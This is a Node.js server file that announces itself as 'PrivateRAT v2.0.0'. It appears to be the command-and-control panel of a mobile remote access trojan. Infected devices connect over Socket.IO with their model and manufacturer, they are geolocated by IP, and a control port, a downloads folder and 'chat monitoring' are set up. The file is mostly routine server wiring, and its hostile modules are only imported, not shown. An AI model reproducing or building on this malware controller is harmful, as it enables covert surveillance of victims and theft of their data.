

// Di bagian atas file
require('dotenv').config();

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const geoip = require('geoip-lite');

// Import new configurations
const middleware = require('./config/middleware');
const DatabaseManager = require('./config/database');

// Initialize database
const dbManager = new DatabaseManager();

// Create Express app
const app = express();
const server = http.createServer(app);

// Initialize Socket.IO
const io = socketIo(server, {
  cors: {
    origin: '*',
    credentials: false
  },
  pingInterval: 30000,
  pingTimeout: 60000
});

// Apply security middleware
app.use(middleware.helmet());
app.use(middleware.cors());
app.use(middleware.compression());
app.use(middleware.morgan());

// Apply rate limiting
app.use('/api/', middleware.rateLimiter.api);
app.use('/login', middleware.rateLimiter.auth);

// Cookie and body parsing middleware
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
app.use(cookieParser());
app.use(bodyParser.json({ limit: 10485760 })); // 10MB
app.use(bodyParser.urlencoded({ extended: true, limit: 10485760 }));

// Set view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '/assets/views'));

// Static files
app.use(express.static(path.join(__dirname, '/assets/webpublic')));

// Import CONST from includes
const CONST = require('./includes/const');

// Global variables
global.CONST = {
  messageKeys: CONST.messageKeys,
  logTypes: CONST.logTypes,
  web_port: process.env.PORT || CONST.web_port || 8080,
  control_port: process.env.CONTROL_PORT || CONST.control_port || 22222,
  downloadsFolder: CONST.downloadsFolder,
  downloadsFullPath: CONST.downloadsFullPath
};
global.db = dbManager;
global.app = app;

// Import and initialize managers
const logManager = require('./includes/logManager');
const clientManager = new (require('./includes/clientManager'))(dbManager);

global.logManager = logManager;
global.clientManager = clientManager;

// Socket.IO connection handling
io.on('connection', (socket) => {
  socket.emit('welcome');
  
  // Get client IP
  let clientIP = socket.handshake.headers['x-forwarded-for'];
  if (!clientIP) {
    clientIP = socket.handshake.address || '0.0.0.0';
  }
  
  const clientParams = socket.handshake.query;
  const clientAddress = socket.request.connection;
  
  // Get geolocation
  const clientGeo = geoip.lookup(clientIP) || {};
  
  // Connect client - validate clientID
  if (!clientParams.id) {
    console.warn('Client connected without ID, disconnecting...');
    socket.disconnect();
    return;
  }
  
  // Connect client
  clientManager.clientConnect(socket, clientParams.id, {
    clientIP,
    clientGeo,
    device: {
      model: clientParams.model || 'Unknown',
      manufacture: clientParams.manf || 'Unknown',
      version: clientParams.release || 'Unknown',
    },
  });

  // Debug mode logging
  if (process.env.NODE_ENV === 'development') {
    const onevent = socket.onevent;
    socket.onevent = function (packet) {
      const args = packet.data || [];
      onevent.call(this, packet);
      packet.data = ['*'].concat(args);
      onevent.call(this, packet);
    };

    socket.on('*', function (event, data) {
      console.log(`Socket event: ${event}`, data);
    });
  }
});

// Import routes
const routes = require('./includes/expressRoutes');
app.use(routes);

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
  res.status(404).render('404', { 
    title: 'Page Not Found',
    message: 'The page you are looking for does not exist.'
  });
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Process terminated');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('Process terminated');
    process.exit(0);
  });
});

// Start server
const port = process.env.PORT || 8080;
server.listen(port, () => {
  console.log(`🚀 PrivateRAT v2.0.0 server started`);
  console.log(`📱 Web interface: http://localhost:${port}`);
  console.log(`🔌 Control port: 22222`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📊 Chat monitoring: Enabled`);
  
  // Log system info
  const os = require('os');
  console.log(`💻 System: ${os.platform()} ${os.release()}`);
  console.log(`🧠 Memory: ${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB total`);
  console.log(`📁 Working directory: ${process.cwd()}`);
});

// Export for testing
module.exports = { app, server, io };
